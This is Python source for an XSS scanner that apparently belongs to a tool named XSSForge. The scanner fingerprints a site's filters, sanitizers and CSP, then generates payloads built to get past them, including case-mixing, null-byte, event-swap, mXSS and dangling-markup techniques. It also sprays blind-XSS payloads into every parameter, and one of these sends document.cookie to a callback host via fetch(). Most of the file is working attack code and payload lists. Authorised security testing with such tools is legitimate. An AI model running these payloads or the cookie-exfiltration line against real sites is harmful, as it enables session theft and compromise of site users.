"""
Adaptive XSS Scanner - The intelligent, self-configuring scanner.

This scanner automatically:
- Probes and detects what filters are in place
- Detects context without manual configuration
- Analyzes CSP headers and generates appropriate bypasses
- Detects sanitizers (DOMPurify, etc.) and uses mXSS techniques
- Verifies payloads actually execute in a real browser
- Adapts payload generation based on what survives filters
- Handles blind XSS with integrated callback tracking
- Crawls for stored XSS across multiple pages

This beats Dalfox by:
1. Headless browser verification (not just reflection detection)
2. Dynamic payload adaptation based on filter probing
3. Real DOM analysis with Playwright
4. Integrated blind XSS callback server
5. CSP-aware payload selection
6. Payloads that work in modern Chrome/Firefox
"""

import asyncio
import re
import hashlib
import time
import json
from dataclasses import dataclass, field
from typing import Iterator, Callable
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from enum import Enum
from pathlib import Path

from xssforge.utils.http import HTTPClient, HTTPConfig
from xssforge.context import ContextAnalyzer, XSSContext, ReflectionType
from xssforge.payloads.generator import PayloadGenerator, PayloadConfig, XSSContext as GenXSSContext
from xssforge.bypasses.filters import FilterEvasion
from xssforge.bypasses.csp import CSPBypass, analyze_csp_header
from xssforge.bypasses.dom_clobbering import DOMClobbering
from xssforge.bypasses.mxss import MutationXSS


class FilterType(Enum):
    """Types of filters detected."""
    NONE = "none"
    BLACKLIST = "blacklist"  # Blocks specific strings
    WHITELIST = "whitelist"  # Only allows specific chars
    ENCODING = "encoding"    # HTML/URL encodes output
    SANITIZER = "sanitizer"  # DOMPurify, Angular, etc.
    WAF = "waf"             # Web Application Firewall


class SanitizerType(Enum):
    """Known sanitizer types."""
    NONE = "none"
    DOMPURIFY = "dompurify"
    ANGULAR = "angular"
    GOOGLE_CLOSURE = "google_closure"
    CUSTOM_REGEX = "custom_regex"
    UNKNOWN = "unknown"


@dataclass
class FilterProfile:
    """Profile of detected filters on a target."""
    filter_type: FilterType = FilterType.NONE
    blocked_chars: set[str] = field(default_factory=set)
    blocked_strings: set[str] = field(default_factory=set)
    encoded_chars: dict[str, str] = field(default_factory=dict)
    sanitizer: SanitizerType = SanitizerType.NONE
    allows_tags: bool = True
    allows_events: bool = True
    allows_javascript_protocol: bool = True
    csp_header: str = ""
    csp_analysis: dict = field(default_factory=dict)


@dataclass
class VerifiedXSS:
    """A verified XSS vulnerability."""
    url: str
    parameter: str
    payload: str
    context: str
    xss_type: str  # reflected, stored, dom, blind
    severity: str  # critical, high, medium
    verified_execution: bool  # True if browser confirmed execution
    evidence: str
    csp_bypassed: bool = False
    sanitizer_bypassed: str = ""
    filter_evasion_used: list[str] = field(default_factory=list)
    reproduction_steps: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "context": self.context,
            "xss_type": self.xss_type,
            "severity": self.severity,
            "verified_execution": self.verified_execution,
            "evidence": self.evidence,
            "csp_bypassed": self.csp_bypassed,
            "sanitizer_bypassed": self.sanitizer_bypassed,
            "filter_evasion_used": self.filter_evasion_used,
            "reproduction_steps": self.reproduction_steps,
        }


@dataclass
class AdaptiveScanConfig:
    """Configuration for adaptive scanning."""
    # HTTP settings
    timeout: float = 30.0
    delay: float = 0.1  # Delay between requests
    max_concurrent: int = 5
    proxy: str | None = None
    headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)

    # Scanning depth
    max_payloads_per_param: int = 100
    probe_filter_first: bool = True  # Probe filters before payload testing

    # Verification
    verify_with_browser: bool = True  # Use Playwright for verification
    browser_timeout: int = 5000  # ms

    # Blind XSS
    blind_xss_enabled: bool = True
    blind_callback_url: str = ""  # Will be auto-generated if empty

    # Crawling for stored XSS
    crawl_for_stored: bool = True
    crawl_depth: int = 2

    # Output
    verbose: bool = False
    callback: Callable[[str], None] | None = None  # Progress callback


class FilterProber:
    """
    Probes a target to understand what filters are in place.

    This is the key to adaptive payload generation - we first understand
    what's blocked before wasting requests on payloads that won't work.
    """

    # Probe strings to test filter behavior
    CHAR_PROBES = [
        ("<", "angle_bracket_open"),
        (">", "angle_bracket_close"),
        ("\"", "double_quote"),
        ("'", "single_quote"),
        ("(", "paren_open"),
        (")", "paren_close"),
        ("/", "forward_slash"),
        ("\\", "backslash"),
        ("=", "equals"),
        (";", "semicolon"),
        (":", "colon"),
        ("&", "ampersand"),
        ("#", "hash"),
        ("%", "percent"),
        ("`", "backtick"),
        ("\n", "newline"),
        ("\t", "tab"),
        ("\x00", "null_byte"),
    ]

    STRING_PROBES = [
        ("script", "script_tag"),
        ("onerror", "onerror_event"),
        ("onload", "onload_event"),
        ("javascript", "javascript_protocol"),
        ("alert", "alert_function"),
        ("eval", "eval_function"),
        ("document", "document_object"),
        ("window", "window_object"),
        ("<script>", "full_script_tag"),
        ("<img", "img_tag"),
        ("<svg", "svg_tag"),
        ("onclick", "onclick_event"),
    ]

    # Unique marker for reflection detection
    CANARY_PREFIX = "xssf0rg3"

    def __init__(self, http_client: HTTPClient):
        self.http_client = http_client

    async def probe_parameter(
        self,
        url: str,
        param: str,
        method: str = "GET"
    ) -> FilterProfile:
        """
        Probe a parameter to understand its filter profile.

        Returns detailed information about what's blocked/encoded.
        """
        profile = FilterProfile()

        # First, check basic reflection
        canary = f"{self.CANARY_PREFIX}{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"

        if method == "GET":
            test_url = self._inject_param(url, param, canary)
            response = await self.http_client.get(test_url)
        else:
            response = await self.http_client.post(url, data={param: canary})

        if canary not in response.body:
            # No reflection at all
            profile.filter_type = FilterType.NONE
            return profile

        # Check CSP header
        csp = response.headers.get("content-security-policy", "")
        if csp:
            profile.csp_header = csp
            profile.csp_analysis = analyze_csp_header(csp)

        # Probe individual characters
        for char, name in self.CHAR_PROBES:
            probe = f"{canary}{char}{canary}"
            if method == "GET":
                test_url = self._inject_param(url, param, probe)
                resp = await self.http_client.get(test_url)
            else:
                resp = await self.http_client.post(url, data={param: probe})

            if probe in resp.body:
                # Character passes through unchanged
                pass
            elif canary in resp.body:
                # Character was modified or removed
                if char not in resp.body:
                    profile.blocked_chars.add(char)
                else:
                    # Check for encoding
                    encoded_variants = {
                        "<": ["&lt;", "&#60;", "&#x3c;"],
                        ">": ["&gt;", "&#62;", "&#x3e;"],
                        "\"": ["&quot;", "&#34;", "&#x22;"],
                        "'": ["&#39;", "&#x27;", "&apos;"],
                        "&": ["&amp;", "&#38;"],
                    }
                    for encoded in encoded_variants.get(char, []):
                        if encoded in resp.body:
                            profile.encoded_chars[char] = encoded
                            break

        # Probe strings
        for string, name in self.STRING_PROBES:
            probe = f"{canary}{string}{canary}"
            if method == "GET":
                test_url = self._inject_param(url, param, probe)
                resp = await self.http_client.get(test_url)
            else:
                resp = await self.http_client.post(url, data={param: probe})

            if probe not in resp.body and canary in resp.body:
                if string.lower() not in resp.body.lower():
                    profile.blocked_strings.add(string)

        # Determine filter type
        if profile.blocked_strings or profile.blocked_chars:
            profile.filter_type = FilterType.BLACKLIST
        if profile.encoded_chars:
            profile.filter_type = FilterType.ENCODING

        # Check for known sanitizers
        profile.sanitizer = await self._detect_sanitizer(url, param, method, canary)
        if profile.sanitizer != SanitizerType.NONE:
            profile.filter_type = FilterType.SANITIZER

        # Summarize capabilities
        profile.allows_tags = "<" not in profile.blocked_chars and ">" not in profile.blocked_chars
        profile.allows_events = "onerror" not in profile.blocked_strings and "onload" not in profile.blocked_strings
        profile.allows_javascript_protocol = "javascript" not in profile.blocked_strings

        return profile

    async def _detect_sanitizer(
        self,
        url: str,
        param: str,
        method: str,
        canary: str
    ) -> SanitizerType:
        """Detect if a known sanitizer is being used."""

        # Test for DOMPurify behavior
        # DOMPurify strips certain patterns but allows others
        dompurify_test = f"{canary}<img src=x onerror=alert(1)>{canary}"

        if method == "GET":
            test_url = self._inject_param(url, param, dompurify_test)
            resp = await self.http_client.get(test_url)
        else:
            resp = await self.http_client.post(url, data={param: dompurify_test})

        # DOMPurify typically keeps <img src=x> but removes onerror
        if "<img src=x>" in resp.body or '<img src="x">' in resp.body:
            if "onerror" not in resp.body:
                return SanitizerType.DOMPURIFY

        # Test for Angular sanitizer
        angular_test = f"{canary}{{{{constructor.constructor('alert(1)')()}}}}{canary}"
        if method == "GET":
            test_url = self._inject_param(url, param, angular_test)
            resp = await self.http_client.get(test_url)
        else:
            resp = await self.http_client.post(url, data={param: angular_test})

        if "{{" not in resp.body and canary in resp.body:
            return SanitizerType.ANGULAR

        return SanitizerType.NONE

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a value into a URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))


class AdaptivePayloadEngine:
    """
    Generates payloads that adapt to the detected filter profile.

    Unlike Dalfox's template-based approach, this engine dynamically
    crafts payloads based on what characters/strings survive the filter.
    """

    def __init__(self):
        self.generator = PayloadGenerator()
        self.filter_evasion = FilterEvasion()
        self.csp_bypass = CSPBypass()
        self.mxss = MutationXSS()
        self.dom_clobbering = DOMClobbering()

    def generate_adapted_payloads(
        self,
        profile: FilterProfile,
        context: XSSContext,
        max_payloads: int = 50
    ) -> list[tuple[str, list[str]]]:
        """
        Generate payloads adapted to the filter profile.

        Returns list of (payload, evasion_techniques_used) tuples.
        """
        payloads = []

        # Strategy 1: Get base payloads for context (always needed)
        basic = self._get_context_payloads(context)
        payloads.extend([(p, []) for p in basic])

        # Strategy 2: If encoding is used, try to work around it
        if profile.filter_type == FilterType.ENCODING:
            payloads.extend(self._generate_encoding_bypass_payloads(profile, context))

        # Strategy 3: If blacklist filtering, evade the blacklist
        if profile.filter_type == FilterType.BLACKLIST:
            payloads.extend(self._generate_blacklist_bypass_payloads(profile, context))

        # Strategy 4: If sanitizer detected, use mXSS techniques
        if profile.filter_type == FilterType.SANITIZER:
            payloads.extend(self._generate_sanitizer_bypass_payloads(profile, context))

        # Strategy 5: If CSP is present, add CSP bypass payloads (always check, independent of filter)
        if profile.csp_header:
            payloads.extend(self._generate_csp_bypass_payloads(profile))

        # Deduplicate and limit
        seen = set()
        unique = []
        for payload, techniques in payloads:
            if payload not in seen:
                seen.add(payload)
                unique.append((payload, techniques))

        return unique[:max_payloads]

    def _get_context_payloads(self, context: XSSContext) -> list[str]:
        """Get base payloads for a context."""
        if context == XSSContext.HTML_BODY:
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<details open ontoggle=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<iframe srcdoc='<script>alert(1)</script>'>",
            ]
        elif context in (XSSContext.HTML_ATTRIBUTE_QUOTED, XSSContext.HTML_ATTRIBUTE_SINGLE):
            q = '"' if context == XSSContext.HTML_ATTRIBUTE_QUOTED else "'"
            return [
                f'{q}><img src=x onerror=alert(1)>',
                f'{q}><svg onload=alert(1)>',
                f'{q} onmouseover=alert(1) x={q}',
                f'{q} onfocus=alert(1) autofocus x={q}',
                f'{q}><script>alert(1)</script>',
                f'{q}/><svg onload=alert(1)>',
            ]
        elif context in (XSSContext.JAVASCRIPT_STRING, XSSContext.JAVASCRIPT_STRING_SINGLE):
            q = '"' if context == XSSContext.JAVASCRIPT_STRING else "'"
            return [
                f'{q};alert(1)//',
                f'{q}+alert(1)+{q}',
                f'{q});alert(1)//',
                f'</script><script>alert(1)</script>',
                f'{q}-alert(1)-{q}',
            ]
        elif context in (XSSContext.URL_HREF, XSSContext.URL_SRC):
            return [
                "javascript:alert(1)",
                "javascript:alert`1`",
                "data:text/html,<script>alert(1)</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            ]
        else:
            return self.generator.quick_payloads()

    def _generate_encoding_bypass_payloads(
        self,
        profile: FilterProfile,
        context: XSSContext
    ) -> list[tuple[str, list[str]]]:
        """Generate payloads that bypass HTML encoding."""
        payloads = []

        # If < and > are encoded, we can't use new tags
        # Focus on context-specific bypasses

        if context in (XSSContext.HTML_ATTRIBUTE_QUOTED, XSSContext.HTML_ATTRIBUTE_SINGLE):
            # Event handler injection without new tags
            q = '"' if context == XSSContext.HTML_ATTRIBUTE_QUOTED else "'"
            payloads.extend([
                (f'{q} onmouseover=alert(1) {q}', ["event_injection"]),
                (f'{q} onfocus=alert(1) autofocus {q}', ["event_injection", "autofocus"]),
                (f'{q} onclick=alert(1) {q}', ["event_injection"]),
            ])

        if context in (XSSContext.JAVASCRIPT_STRING, XSSContext.JAVASCRIPT_STRING_SINGLE):
            q = '"' if context == XSSContext.JAVASCRIPT_STRING else "'"
            payloads.extend([
                (f'{q};alert(1)//', ["js_breakout"]),
                (f'{q}+alert(1)+{q}', ["js_breakout", "string_concat"]),
            ])

        # DOM-based payloads that don't need < >
        if context == XSSContext.HTML_BODY:
            # These work in specific scenarios (e.g., inside existing script)
            payloads.extend([
                ("';alert(1)//", ["js_breakout"]),
                ("\";alert(1)//", ["js_breakout"]),
            ])

        return payloads

    def _generate_blacklist_bypass_payloads(
        self,
        profile: FilterProfile,
        context: XSSContext
    ) -> list[tuple[str, list[str]]]:
        """Generate payloads that evade blacklist filters."""
        payloads = []
        base = self._get_context_payloads(context)

        for base_payload in base:
            # Skip if base payload would be completely blocked
            skip = False
            for blocked in profile.blocked_strings:
                if blocked.lower() in base_payload.lower():
                    skip = True
                    break

            if not skip:
                payloads.append((base_payload, []))
                continue

            # Generate evasions
            techniques_used = []
            modified = base_payload

            # Case variation if script/onerror/etc blocked
            if "script" in profile.blocked_strings:
                modified = modified.replace("script", "ScRiPt").replace("SCRIPT", "ScRiPt")
                techniques_used.append("case_mixing")

            if "onerror" in profile.blocked_strings:
                # Try alternative events
                alternatives = [
                    ("onerror", "onload"),
                    ("onerror", "onfocus"),
                    ("onerror", "onmouseover"),
                ]
                for old, new in alternatives:
                    if new not in profile.blocked_strings:
                        modified = modified.replace(old, new)
                        techniques_used.append(f"event_swap:{new}")
                        break

            if "alert" in profile.blocked_strings:
                # Use alternatives
                alternatives = ["confirm", "prompt", "print"]
                for alt in alternatives:
                    if alt not in profile.blocked_strings:
                        modified = modified.replace("alert", alt)
                        techniques_used.append(f"function_swap:{alt}")
                        break

            # Null byte insertion
            if "script" in profile.blocked_strings and "\x00" not in profile.blocked_chars:
                null_version = modified.replace("script", "scr\x00ipt")
                payloads.append((null_version, ["null_byte_insertion"]))

            # Newline/tab insertion
            if "\n" not in profile.blocked_chars:
                newline_version = modified.replace("<script", "<script\n")
                payloads.append((newline_version, ["whitespace_insertion"]))

            if techniques_used:
                payloads.append((modified, techniques_used))

            # Generate more variants using FilterEvasion module
            evasion_variants = self.filter_evasion.evade_all(base_payload)
            for variant in evasion_variants[:5]:  # Limit variants
                if variant != base_payload:
                    # Check it doesn't contain blocked content
                    variant_ok = True
                    for blocked in profile.blocked_strings:
                        if blocked.lower() in variant.lower():
                            variant_ok = False
                            break
                    if variant_ok:
                        payloads.append((variant, ["filter_evasion_module"]))

        return payloads

    def _generate_sanitizer_bypass_payloads(
        self,
        profile: FilterProfile,
        context: XSSContext
    ) -> list[tuple[str, list[str]]]:
        """Generate payloads that bypass sanitizers using mXSS."""
        payloads = []

        if profile.sanitizer == SanitizerType.DOMPURIFY:
            dompurify_bypasses = self.mxss.dompurify_bypasses()
            for bypass in dompurify_bypasses:
                payloads.append((bypass, ["mxss", "dompurify_bypass"]))

        elif profile.sanitizer == SanitizerType.ANGULAR:
            angular_bypasses = self.mxss.angular_sanitizer_bypasses()
            for bypass in angular_bypasses:
                payloads.append((bypass, ["mxss", "angular_bypass"]))

        elif profile.sanitizer == SanitizerType.GOOGLE_CLOSURE:
            closure_bypasses = self.mxss.google_closure_bypasses()
            for bypass in closure_bypasses:
                payloads.append((bypass, ["mxss", "closure_bypass"]))

        else:
            # Unknown sanitizer - try all mXSS techniques
            for bypass in self.mxss.mutation_payloads():
                payloads.append((bypass, ["mxss", "mutation"]))
            for bypass in self.mxss.regex_sanitizer_bypasses():
                payloads.append((bypass, ["mxss", "regex_bypass"]))

        return payloads

    def _generate_csp_bypass_payloads(
        self,
        profile: FilterProfile
    ) -> list[tuple[str, list[str]]]:
        """Generate payloads that work within or bypass CSP."""
        payloads = []

        analysis = profile.csp_analysis

        # If unsafe-inline is allowed, normal payloads work
        if analysis.get("has_unsafe_inline"):
            payloads.append((
                "<script>alert(1)</script>",
                ["csp_unsafe_inline"]
            ))

        # If unsafe-eval is allowed
        if analysis.get("has_unsafe_eval"):
            payloads.append((
                "<img src=x onerror=eval('alert(1)')>",
                ["csp_unsafe_eval"]
            ))

        # JSONP bypasses for whitelisted domains
        for method in analysis.get("bypass_methods", []):
            if "JSONP" in method:
                jsonp_payloads = self.csp_bypass.jsonp_csp_bypass()
                for p in jsonp_payloads[:3]:
                    payloads.append((p, ["csp_jsonp_bypass"]))

            if "AngularJS" in method:
                angular_payloads = self.csp_bypass.angular_csp_bypass()
                for p in angular_payloads[:3]:
                    payloads.append((p, ["csp_angular_bypass"]))

        # Base tag bypass
        base_payloads = self.csp_bypass.base_tag_bypass()
        for p in base_payloads[:2]:
            payloads.append((p, ["csp_base_tag"]))

        # Dangling markup for data exfiltration
        dangling_payloads = self.csp_bypass.dangling_markup()
        for p in dangling_payloads[:2]:
            payloads.append((p, ["csp_dangling_markup"]))

        return payloads


class AdaptiveXSSScanner:
    """
    The main adaptive XSS scanner.

    This scanner automatically:
    1. Discovers parameters to test
    2. Probes each parameter to understand filter behavior
    3. Generates adapted payloads based on filter profile
    4. Tests payloads and verifies execution in browser
    5. Handles stored XSS by crawling related pages
    6. Injects blind XSS payloads into all inputs
    """

    def __init__(self, config: AdaptiveScanConfig | None = None):
        self.config = config or AdaptiveScanConfig()
        self.http_client: HTTPClient | None = None
        self.prober: FilterProber | None = None
        self.payload_engine = AdaptivePayloadEngine()
        self.context_analyzer = ContextAnalyzer()
        self.findings: list[VerifiedXSS] = []
        self._playwright_available = False

    async def __aenter__(self):
        http_config = HTTPConfig(
            timeout=self.config.timeout,
            proxy=self.config.proxy,
            max_redirects=5,
        )
        self.http_client = HTTPClient(http_config)
        await self.http_client._init_client()
        self.prober = FilterProber(self.http_client)

        # Check if Playwright is available for browser verification
        try:
            from playwright.async_api import async_playwright
            self._playwright_available = True
        except ImportError:
            self._playwright_available = False
            if self.config.verify_with_browser:
                self._log("Warning: Playwright not installed. Browser verification disabled.")

        return self

    async def __aexit__(self, *args):
        if self.http_client:
            await self.http_client.close()

    def _log(self, message: str):
        """Log progress."""
        if self.config.verbose:
            print(f"[XSSForge] {message}")
        if self.config.callback:
            self.config.callback(message)

    async def scan(self, url: str) -> list[VerifiedXSS]:
        """
        Scan a URL for XSS vulnerabilities.

        This is the main entry point. It automatically:
        1. Parses the URL for parameters
        2. Probes filter behavior
        3. Generates adapted payloads
        4. Tests and verifies
        """
        self.findings = []
        self._log(f"Starting adaptive scan of {url}")

        # Parse URL to find parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            self._log("No parameters found in URL. Testing common parameter names...")
            # Test common parameter names
            params = {p: ["test"] for p in [
                "q", "query", "search", "s", "id", "name", "value",
                "input", "text", "data", "msg", "message", "content",
                "url", "redirect", "return", "next", "callback"
            ]}

        # Scan each parameter
        for param in params:
            self._log(f"Testing parameter: {param}")
            findings = await self._scan_parameter(url, param)
            self.findings.extend(findings)

        # Test for DOM XSS via fragment
        self._log("Testing for DOM XSS via URL fragment...")
        dom_findings = await self._scan_fragment(url)
        self.findings.extend(dom_findings)

        # Inject blind XSS payloads
        if self.config.blind_xss_enabled:
            self._log("Injecting blind XSS payloads...")
            await self._inject_blind_xss(url, params)

        return self.findings

    async def _scan_parameter(self, url: str, param: str) -> list[VerifiedXSS]:
        """Scan a single parameter with adaptive payload generation."""
        findings = []

        # Step 1: Probe filter behavior
        self._log(f"  Probing filter behavior for {param}...")
        profile = await self.prober.probe_parameter(url, param)

        self._log(f"  Filter profile: type={profile.filter_type.value}, "
                  f"blocked_chars={len(profile.blocked_chars)}, "
                  f"blocked_strings={len(profile.blocked_strings)}, "
                  f"sanitizer={profile.sanitizer.value}")

        if profile.csp_header:
            self._log(f"  CSP detected: {profile.csp_header[:80]}...")

        # Step 2: Detect reflection context
        context = await self._detect_context(url, param)
        self._log(f"  Detected context: {context.value}")

        # Step 3: Generate adapted payloads
        payloads = self.payload_engine.generate_adapted_payloads(
            profile, context, self.config.max_payloads_per_param
        )
        self._log(f"  Generated {len(payloads)} adapted payloads")

        # Step 4: Test payloads
        for payload, techniques in payloads:
            result = await self._test_payload(url, param, payload, context, profile, techniques)
            if result:
                findings.append(result)
                self._log(f"  [FOUND] {payload[:50]}... ({result.xss_type})")

                # Optionally stop after first finding per param
                # (configurable for speed vs completeness)
                break

        return findings

    async def _detect_context(self, url: str, param: str) -> XSSContext:
        """Detect the reflection context for a parameter."""
        canary = "xssforge_ctx_probe"
        test_url = self._inject_param(url, param, canary)

        try:
            response = await self.http_client.get(test_url)

            if canary not in response.body:
                return XSSContext.UNKNOWN

            # Use context analyzer
            context, _, _ = self.context_analyzer.analyze(response.body, canary)

            # Map to generator's XSSContext enum
            context_map = {
                "html_body": XSSContext.HTML_BODY,
                "html_attribute_quoted": XSSContext.HTML_ATTRIBUTE_QUOTED,
                "html_attribute_single": XSSContext.HTML_ATTRIBUTE_SINGLE,
                "javascript_string": XSSContext.JAVASCRIPT_STRING,
                "javascript_string_single": XSSContext.JAVASCRIPT_STRING_SINGLE,
                "url_href": XSSContext.URL_HREF,
                "url_src": XSSContext.URL_SRC,
            }

            return context_map.get(context.value, XSSContext.UNKNOWN)

        except Exception:
            return XSSContext.UNKNOWN

    async def _test_payload(
        self,
        url: str,
        param: str,
        payload: str,
        context: XSSContext,
        profile: FilterProfile,
        techniques: list[str]
    ) -> VerifiedXSS | None:
        """Test a payload and verify if it works."""
        test_url = self._inject_param(url, param, payload)

        try:
            response = await self.http_client.get(test_url)

            # Check for reflection
            if not self._check_reflection(payload, response.body, context):
                return None

            # Verify execution in browser if enabled
            verified = False
            if self.config.verify_with_browser and self._playwright_available:
                verified = await self._verify_in_browser(test_url)

            # Determine severity
            severity = "high" if verified else "medium"
            if profile.csp_header and any("csp" in t for t in techniques):
                severity = "critical"  # CSP bypass is high value

            return VerifiedXSS(
                url=test_url,
                parameter=param,
                payload=payload,
                context=context.value,
                xss_type="reflected",
                severity=severity,
                verified_execution=verified,
                evidence=f"Payload reflected in {context.value} context",
                csp_bypassed=bool(profile.csp_header and any("csp" in t for t in techniques)),
                sanitizer_bypassed=profile.sanitizer.value if "mxss" in techniques else "",
                filter_evasion_used=techniques,
                reproduction_steps=f"1. Navigate to: {test_url}\n2. Observe XSS execution",
            )

        except Exception as e:
            self._log(f"  Error testing payload: {e}")
            return None

    def _check_reflection(self, payload: str, body: str, context: XSSContext) -> bool:
        """Check if payload is reflected in an executable manner."""
        # Simple check - payload appears in response
        if payload in body:
            return True

        # Check for partial reflection (key parts)
        key_parts = []
        if "alert" in payload:
            key_parts.append("alert")
        if "onerror" in payload:
            key_parts.append("onerror")
        if "onload" in payload:
            key_parts.append("onload")
        if "javascript:" in payload:
            key_parts.append("javascript:")
        if "<script>" in payload:
            key_parts.append("<script>")

        for part in key_parts:
            if part in body:
                return True

        return False

    async def _verify_in_browser(self, url: str) -> bool:
        """
        Verify XSS execution in a real browser using Playwright.

        This is the key differentiator from Dalfox - we actually confirm
        the JavaScript executes, not just that the payload reflects.
        """
        if not self._playwright_available:
            return False

        try:
            from playwright.async_api import async_playwright

            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context()
                page = await context.new_page()

                alert_triggered = False

                # Capture dialog events (alert, confirm, prompt)
                async def handle_dialog(dialog):
                    nonlocal alert_triggered
                    alert_triggered = True
                    await dialog.dismiss()

                page.on("dialog", handle_dialog)

                # Navigate to URL
                try:
                    await page.goto(url, timeout=self.config.browser_timeout)
                    # Wait a bit for any async XSS to trigger
                    await page.wait_for_timeout(1000)
                except Exception:
                    pass  # Page might error but dialog still triggered

                await browser.close()
                return alert_triggered

        except Exception as e:
            self._log(f"Browser verification error: {e}")
            return False

    async def _scan_fragment(self, url: str) -> list[VerifiedXSS]:
        """Scan for DOM XSS via URL fragment."""
        findings = []

        # Test common DOM XSS payloads via fragment
        fragment_payloads = [
            "#<img src=x onerror=alert(1)>",
            "#<svg onload=alert(1)>",
            "#javascript:alert(1)",
            "#1' onerror='alert(1)' '",
            "#\"><img src=x onerror=alert(1)>",
        ]

        for frag_payload in fragment_payloads:
            test_url = url.split("#")[0] + frag_payload

            # First check if the page uses location.hash
            try:
                response = await self.http_client.get(url)
                if "location.hash" in response.body or "location.href" in response.body:
                    # Potential DOM XSS - verify in browser
                    if self.config.verify_with_browser and self._playwright_available:
                        if await self._verify_in_browser(test_url):
                            findings.append(VerifiedXSS(
                                url=test_url,
                                parameter="fragment",
                                payload=frag_payload,
                                context="dom_sink",
                                xss_type="dom",
                                severity="high",
                                verified_execution=True,
                                evidence="DOM XSS via URL fragment - verified in browser",
                                reproduction_steps=f"1. Navigate to: {test_url}\n2. Observe XSS execution",
                            ))
                            break
            except Exception:
                continue

        return findings

    async def _inject_blind_xss(self, url: str, params: dict):
        """Inject blind XSS payloads for delayed execution detection."""
        if not self.config.blind_callback_url:
            self._log("  Blind XSS callback URL not configured, skipping")
            return

        callback = self.config.blind_callback_url

        # Generate unique tracking ID
        tracking_id = hashlib.md5(f"{url}{time.time()}".encode()).hexdigest()[:12]

        blind_payloads = [
            f'"><script src="{callback}?id={tracking_id}"></script>',
            f"'><script src='{callback}?id={tracking_id}'></script>",
            f'<img src=x onerror="fetch(\'{callback}?id={tracking_id}&c=\'+document.cookie)">',
            f'"><img src="{callback}?id={tracking_id}">',
        ]

        for param in params:
            for payload in blind_payloads:
                test_url = self._inject_param(url, param, payload)
                try:
                    await self.http_client.get(test_url)
                    self._log(f"  Injected blind XSS payload into {param} (tracking: {tracking_id})")
                except Exception:
                    pass

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a value into a URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def get_report(self) -> dict:
        """Generate a report of all findings."""
        return {
            "total_findings": len(self.findings),
            "verified_findings": sum(1 for f in self.findings if f.verified_execution),
            "by_severity": {
                "critical": [f.to_dict() for f in self.findings if f.severity == "critical"],
                "high": [f.to_dict() for f in self.findings if f.severity == "high"],
                "medium": [f.to_dict() for f in self.findings if f.severity == "medium"],
            },
            "findings": [f.to_dict() for f in self.findings],
        }


async def adaptive_scan(url: str, **kwargs) -> list[VerifiedXSS]:
    """Convenience function for adaptive scanning."""
    config = AdaptiveScanConfig(**kwargs)
    async with AdaptiveXSSScanner(config) as scanner:
        return await scanner.scan(url)


def adaptive_scan_sync(url: str, **kwargs) -> list[VerifiedXSS]:
    """Synchronous wrapper for adaptive scanning."""
    return asyncio.run(adaptive_scan(url, **kwargs))
